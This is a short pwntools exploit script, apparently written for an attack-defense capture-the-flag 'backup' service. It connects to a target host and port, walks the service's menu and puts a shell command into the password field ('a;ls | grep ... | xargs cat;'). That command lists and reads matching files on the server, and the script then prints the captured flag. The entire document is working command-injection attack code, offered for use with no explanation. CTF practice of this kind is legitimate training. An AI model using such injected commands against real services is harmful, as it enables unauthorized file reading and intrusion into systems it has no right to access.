from pwn import *

pwnlib.args.SILENT('SILENT')

def start_backup(r, backup_name, password):
    r.sendline("1")
    r.recvuntil("backup: ")
    r.sendline(backup_name)
    r.recvuntil("backup: ")
    r.sendline(password)

def add_file(r, file_size, file_name):
    r.sendline("1")
    r.recvline("file? ")
    r.sendline(file_size)
    r.recvuntil("file\n")
    r.sendline(file_name)

def exploit(argv):
    r = remote(str(sys.argv[1]),int(sys.argv[2]))
    #r = process("/home/ctf/backup/ro/backup")
    r.recvuntil("Exit.\n")
    r.sendline("2")
    r.recvuntil("backup: ")
    r.sendline("lol")
    r.recvuntil("backup: ")
    r.sendline("a;ls | grep " + sys.argv[3] + " | xargs cat;")
    r.recvuntil('FLG')
    flag = 'FLG' + r.recvuntil('Hello')
    flag = flag[:-5]
    print flag

sys.exit(exploit(sys.argv[1:]))
